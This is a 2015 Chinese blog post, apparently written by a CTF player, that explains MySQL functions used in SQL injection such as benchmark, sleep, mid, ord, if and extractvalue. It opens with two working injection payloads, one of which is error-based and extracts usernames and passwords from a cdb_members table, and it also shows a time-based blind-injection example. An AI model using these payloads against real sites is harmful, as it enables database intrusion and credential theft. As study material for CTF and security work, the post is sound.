title: 关于sqli注入的特殊函数
date: 2015-10-24 21:30:47
tags:
- Blogs
- sqli
categories:
- Blogs
---

最近几次参与的几个ctf比赛加上之前的对sql注入一段时间的研究，让我对sql注入有了新的认识，这里留存下几个函数的用法，到需要的时候可以拿出来用。
<!--more-->

首先贴出来两个payload，下面根据这两个payload分析每一个函数。

```
)+and+(select+1+from+(select+count(*),concat((select+(select+(select+concat(username,0x27,password)+from+cdb_members+limit+1)+)+from+information_schema.tables+limit+0,1),floor(rand(0)*2))x+from+information_schema.tables+group+by+x)a)%23##
```

```
?l=1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(schema_name)) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1);
```
# 0x01 benchmark(x, y) #

基于时间注入的时候经常用得到
```
mysql > select benchmark(5000000,sha1(1));   //执行5000000次sha1(1)
+----------------------------+
| benchmark(5000000,sha1(1)) |
+----------------------------+
|                          0 |
+----------------------------+
1 row in set (2.58 sec)
```
是执行5000000对1的sha1加密，所以会有延迟。

# 0x02 sleep(x) #

和上面相同，同样是造成时间的延迟

# 0x03 cast（x as type) #

强制类型转换，把x转换为int char这样的

# 0x04 ifnull(expr1 , expr2) #

如果 expr1 不是 NULL，IFNULL() 返回 expr1，否则它返回 expr2。

```
mysql> SELECT IFNULL(1,0);
+-------------+
| IFNULL(1,0) |
+-------------+
|           1 |
+-------------+
1 row in set
```

# 0x05 mid(x,y,z) #
SQL MID() 函数用于得到一个字符串的一部分。这个函数被MySQL支持，但不被MS SQL Server和Oracle支持。
在SQL Server， Oracle 数据库中，我们可以使用 SQL SUBSTRING函数或者 SQL SUBSTR函数作为替代。

```
SELECT MID(ColumnName, Start [, Length])
FROM TableName
```
大概是指从字符串x中第y位取z位数
ps:这里的y是从1开始，并不是从0开始的
```
mysql> SELECT MID('NowaMagic', 5, 5);
+------------------------+
| MID('NowaMagic', 5, 5) |
+------------------------+
| Magic                  |
+------------------------+
1 row in set
```
# 0x06 ORD(x) #
ORD() 函数返回字符串第一个字符的 ASCII 值。
```
mysql> SELECT ORD('i');
+----------+
| ORD('i') |
+----------+
|      105 |
+----------+
1 row in set
```

# 0x07 ASCII(x) #
返回最左边的字符的字符串str的数值。如果str是空字符串，返回0。如果str为NULL，返回NULL
```
SQL> SELECT ASCII('d');
+---------------------------------------------------------+
| ASCII('d')                                              |
+---------------------------------------------------------+
| 100                                                      |
+---------------------------------------------------------+
1 row in set (0.00 sec)
```

# 0x08 substr(x,y,z) #
和上面的mid()相同，就不赘述了

# 0x09 if(x,y,z) #
如果x为真，则y，否则z
这里配合前面的函数就能构造出强大的盲注payload
```
mysql > select if((ord(mid((select version()),1,1))) like 53,1,benchmark(5000000,sha1(1))) a;
+---+
| a |
+---+
| 1 |
+---+
1 row in set (0.00 sec)
```
这里吧like换成<>都会变化

# 0x0a rand() #
生成随机数，在0~1之间

# 0x0b concat（x,y) #

SQL CONCAT函数用于将两个字符串连接起来，形成一个单一的字符串。
```
SQL> SELECT CONCAT('FIRST ', 'SECOND');
+----------------------------+
| CONCAT('FIRST ', 'SECOND') |
+----------------------------+
| FIRST SECOND               |
+----------------------------+
1 row in set (0.00 sec)
```
这里的concat中间可以加入符号，比如0x20

# 0x0c count() #
应该叫统计函数
COUNT(column_name) 函数返回指定列的值的数目
COUNT(*) 函数返回表中的记录数
COUNT(DISTINCT column_name) 函数返回指定列的不同值的数目：

# 0x0d procedure analyse() #

可以接在LIMIT后面的子句只有PROCEDURE、INTO OUTFILE可以利用，根据官方手册，analyse后面可以有两个参数，像这样analyse(1,1)

# 0x0e floor,ExtractValue,UpdateXml报错注入 #
floor(rand(0)*2))
select extractvalue这样的函数都会报错

# 0x0f Lpad(),rpad() #

